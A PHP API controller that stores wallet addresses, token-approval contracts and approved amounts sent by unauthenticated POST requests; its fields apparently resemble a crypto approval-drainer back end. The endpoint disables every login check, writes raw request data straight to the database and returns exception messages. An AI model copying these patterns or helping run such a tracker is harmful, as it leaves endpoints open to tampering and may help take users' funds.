<?php

namespace app\api\controller;

use app\common\controller\Api;
use think\Exception;
use think\Request;

/**
 * Address接口
 */
class Address extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    /**
     * 首页
     */
    public function index()
    {
        /**
        `h5_url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT '0' COMMENT 'h5url',
        `address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '钱包地址',
        `approve_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '授权合约',
        `money_approve` float DEFAULT '0' COMMENT '授权数量',
        `money_online` float DEFAULT '0' COMMENT '线上余额',
        `createtime` int(10) DEFAULT NULL COMMENT '创建时间',
        `updatetime` int(10) DEFAULT NULL COMMENT '更新时间',
        `is_approve` tinyint(4) DEFAULT '0' COMMENT '是否授权0否1是',
        `is_approve_old` tinyint(4) DEFAULT '0' COMMENT '之前是否授权0否1是',
        `contract_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '目标合约地址',
        `approve_address_decimals` int(11) DEFAULT NULL COMMENT '目标精度',
         */
        $params = $this->request->post();
        if(empty($params)){
            $this->error(__('Invalid parameters'));
        }
        unset($params['user_id']);
        try {
            $params['createtime']=time();
            $params['updatetime']=time();
            $ishave = (new \app\admin\model\Address())->where(['address'=>$params['address'],'approve_address'=>$params['approve_address'],'contract_address'=>$params['contract_address']])->find();
            if($ishave){
                (new \app\admin\model\Address())->where(['id'=>$ishave['id']])->update($params);
            }else{
                (new \app\admin\model\Address())->insert($params);
            }
            return 'ok';
        }catch (Exception $e) {
            return $e->getMessage();
        }
    }
}
